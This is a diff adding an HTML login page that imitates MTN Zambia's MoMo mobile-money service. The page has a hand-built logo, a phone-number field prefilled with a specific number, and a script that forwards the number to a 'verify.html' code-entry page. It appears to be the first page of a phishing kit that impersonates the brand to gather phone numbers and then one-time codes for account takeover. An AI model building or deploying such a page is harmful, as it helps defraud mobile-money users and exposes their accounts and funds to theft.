@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - MoMo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #f4f4f4;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            background: #ffffff;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+
+        .hamburger {
+            font-size: 22px;
+            color: #333;
+            cursor: pointer;
+            line-height: 1;
+            user-select: none;
+        }
+
+        .logo-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 42px;
+            height: 42px;
+            background: #ffcc00;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 11px;
+            color: #004f9f;
+            line-height: 1;
+            text-align: center;
+            border: 2px solid #004f9f;
+        }
+
+        .logo-text {
+            font-weight: 800;
+            font-size: 20px;
+            color: #004f9f;
+            letter-spacing: -0.5px;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #222;
+            flex: 1;
+        }
+
+        /* ===== MAIN ===== */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 60px 16px;
+        }
+
+        .page-title {
+            font-size: 32px;
+            font-weight: 800;
+            color: #111;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        /* ===== LOGIN CARD ===== */
+        .card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 16px;
+            padding: 44px 36px 36px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+
+        .card-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 20px;
+        }
+
+        .card input {
+            width: 100%;
+            padding: 18px 20px;
+            font-size: 17px;
+            font-family: inherit;
+            border: 2px solid #ffcc00;
+            border-radius: 10px;
+            background: #fffdf5;
+            color: #111;
+            outline: none;
+            text-align: center;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-bottom: 24px;
+            transition: box-shadow 0.2s;
+        }
+
+        .card input:focus {
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.25);
+        }
+
+        .proceed-btn {
+            display: block;
+            width: 100%;
+            background: #ffcc00;
+            color: #111;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+        }
+
+        .proceed-btn:hover {
+            background: #e6b800;
+        }
+
+        .proceed-btn:active {
+            transform: scale(0.99);
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background: #111;
+            color: #ffcc00;
+            text-align: center;
+            padding: 18px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 22px 26px;
+            }
+            .page-title {
+                font-size: 26px;
+            }
+            .header-title {
+                font-size: 15px;
+            }
+            .logo-text {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="header">
+        <span class="hamburger">☰</span>
+        <div class="logo-box">
+            <div class="logo-icon">MoMo<br>MTN</div>
+            <span class="logo-text">MoMo</span>
+        </div>
+        <span class="header-title">MTN Mobile Services</span>
+    </header>
+
+    <!-- MAIN -->
+    <main class="main">
+        <h1 class="page-title">Login</h1>
+
+        <div class="card">
+            <p class="card-label">Enter Your MTN Zambia Phone Number:</p>
+
+            <form id="loginForm">
+                <input type="tel" id="phone" name="phone" value="0714915335" placeholder="07XXXXXXXX" required>
+                <button type="submit" class="proceed-btn">Proceed</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        © 2026 MoMo
+    </footer>
+
+    <script>
+    const params = new URLSearchParams(window.location.search);
+    const phoneFromUrl = params.get('phone');
+    if (phoneFromUrl) {
+        document.getElementById('phone').value = phoneFromUrl;
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        const phone = document.getElementById('phone').value.trim();
+        if (!phone) {
+            alert('Please enter your phone number');
+            return;
+        }
+        // ✅ Go to the code input page
+        window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+    });
+</script>
+</body>
+</html>
